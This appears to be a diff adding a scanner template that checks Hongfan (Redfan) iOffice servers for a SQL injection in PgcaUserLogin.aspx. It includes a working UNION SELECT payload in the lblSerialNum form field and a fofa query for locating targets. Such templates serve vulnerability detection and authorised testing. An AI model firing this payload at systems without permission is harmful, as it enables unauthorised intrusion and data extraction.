@@ -1,0 +1,49 @@
+id: poc-yaml-hongfan-ioffice-pgcauserlogin-aspx-sqli
+info:
+  name: Redfan iOffice PgcaUserLogin.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: iOffice
+    fofa: app="红帆-ioffice"
+variables:
+  t1: "{{rand_int(10000, 99999)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        GET /ioffice/Identity/PgcaUserLogin.aspx HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: VIEWSTATE
+        group: 1
+        regex:
+          - "name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(.*?)\""
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /ioffice/Identity/PgcaUserLogin.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        __EVENTTARGET=btVerify&__EVENTARGUMENT=&__VIEWSTATE={{VIEWSTATE}}&__VIEWSTATEGENERATOR=993A7E6F&btVerify=&CertID=&lblSerialNum=-1'+UNION+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+&txthidIsLogin=1&UserPIN=123456
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "iOffice"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
